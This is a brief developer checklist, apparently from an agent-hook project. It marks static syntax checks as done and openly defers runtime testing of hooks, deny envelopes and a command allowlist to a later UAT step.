- [x] Static gates: `node --check` on every new/modified `.js` file; `bash -n` on any shell script touched
- [DEFERRED-TO-UAT] **DEFER TO UAT** — do not run in this task: firing each hook against a crafted JSON payload on stdin, verifying exit codes and deny envelopes, and confirming the `oraios/serena` allowlist permits the real bootstrap command. These are runtime behaviors; `/uat-generate` will cover them
